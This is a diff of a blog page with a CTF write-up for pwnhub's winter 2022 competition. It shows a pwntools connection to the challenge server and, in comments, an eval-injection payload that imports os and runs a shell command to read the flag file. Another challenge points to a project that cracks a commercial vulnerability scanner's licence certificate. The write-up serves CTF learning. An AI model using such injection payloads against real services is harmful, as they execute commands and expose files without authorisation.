@@ -8,16 +8,16 @@
   <link rel="dns-prefetch" href="http://example.com">
   <title>pwnhub冬季赛2022 | ZimaBlue&#39;s Blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="Misc游戏来咯签到，注册游戏账号登录，在侧边栏看到flag1. 坐井观天12345678from pwn import *io &#x3D; remote(&amp;#x27;47.97.127.1&amp;#x27;,21542)io.interactive()# $ eval(input())# __import__(&amp;#x27;os&amp;#x27;).system(&amp;#x27;cat flag&amp;#x27;)# flag">
+  <meta name="description" content="Misc游戏来咯签到，注册游戏账号登录，在侧边栏看到flag1.">
 <meta property="og:type" content="article">
 <meta property="og:title" content="pwnhub冬季赛2022">
 <meta property="og:url" content="http://example.com/2022/12/18/pwnhub%E5%86%AC%E5%AD%A3%E8%B5%9B2022/index.html">
 <meta property="og:site_name" content="ZimaBlue&#39;s Blog">
-<meta property="og:description" content="Misc游戏来咯签到，注册游戏账号登录，在侧边栏看到flag1. 坐井观天12345678from pwn import *io &#x3D; remote(&amp;#x27;47.97.127.1&amp;#x27;,21542)io.interactive()# $ eval(input())# __import__(&amp;#x27;os&amp;#x27;).system(&amp;#x27;cat flag&amp;#x27;)# flag">
+<meta property="og:description" content="Misc游戏来咯签到，注册游戏账号登录，在侧边栏看到flag1.">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="http://example.com/2022/12/18/pwnhub%E5%86%AC%E5%AD%A3%E8%B5%9B2022/1.png">
 <meta property="article:published_time" content="2022-12-18T01:20:47.000Z">
-<meta property="article:modified_time" content="2022-12-19T05:49:28.571Z">
+<meta property="article:modified_time" content="2022-12-19T05:53:09.826Z">
 <meta property="article:author" content="ZimaBlue">
 <meta property="article:tag" content="crypto">
 <meta property="article:tag" content="misc">
@@ -195,6 +195,7 @@
     <div class="article-entry" itemprop="articleBody">
       
         <h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="游戏来咯"><a href="#游戏来咯" class="headerlink" title="游戏来咯"></a>游戏来咯</h3><p>签到，注册游戏账号登录，在侧边栏看到flag1.</p>
+<span id="more"></span>
 <h3 id="坐井观天"><a href="#坐井观天" class="headerlink" title="坐井观天"></a>坐井观天</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;47.97.127.1&#x27;</span>,<span class="number">21542</span>)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># $ eval(input())</span></span><br><span class="line"><span class="comment"># __import__(&#x27;os&#x27;).system(&#x27;cat flag&#x27;)</span></span><br><span class="line"><span class="comment"># flag&#123;5de8088410b719e42f82132163672a84&#125;</span></span><br></pre></td></tr></table></figure>
 <h3 id="证书里也有秘密"><a href="#证书里也有秘密" class="headerlink" title="证书里也有秘密"></a>证书里也有秘密</h3><p>长亭的漏扫工具xray的证书解析，自己写的话比较麻烦，找到个<a target="_blank" rel="noopener" href="https://github.com/Lz1y/xray-crack">项目</a>，go build然后解析即可。<br><img src="/2022/12/18/pwnhub%E5%86%AC%E5%AD%A3%E8%B5%9B2022/1.png" class></p>
 <h3 id="垃圾邮件分析"><a href="#垃圾邮件分析" class="headerlink" title="垃圾邮件分析"></a>垃圾邮件分析</h3><p>原本是个AI题，但是验证只需要10个数据，那么直接手动交互人工识别更简单。</p>
